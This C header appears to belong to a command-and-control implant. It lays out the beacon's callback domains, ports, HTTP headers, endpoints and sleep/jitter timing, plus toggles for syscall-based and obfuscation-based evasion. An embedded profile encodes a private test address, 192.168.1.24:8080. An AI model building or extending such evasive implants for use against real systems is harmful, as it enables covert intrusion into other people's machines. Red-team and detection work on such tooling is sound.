#pragma once
#include <windows.h>


struct DomainEntrys {
	PCHAR domain;
	UINT  port;
	UINT isHttps;
	BYTE  UseSSL;
};


struct HeaderEntrys {
	PCHAR Key;
	PCHAR value;
};

struct Config {
	struct DomainEntrys* domains;
	size_t domaincounts;

	struct HeaderEntrys* headers;
	size_t HeaderCount;
	PBYTE GetEndpoint;
	PBYTE PostEndpoint;

	UINT Sleep;
	UINT Jitter;
	UINT SyscallType; // 0 = no syscalls | 1 = direct | 2 = indirect
	UINT UseHeapObf; //  0 = no | 1 = yes
	UINT SleepObf;   //   0 = no | 1 = yes
};


inline PBYTE GetProfile() {
	return (PBYTE)"\x01\x00\x00\x00\x0c\x00\x00\x00\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x32\x34\x00\x00\x00\x00\x90\x1f\x00\x00\x01\x00\x00\x00\x08\x00\x00\x00\x54\x45\x53\x54\x31\x32\x33\x34";
}


inline UINT GetProfileSize() {
	return 44;
}


BOOL LoadConfig();
extern Config* conf;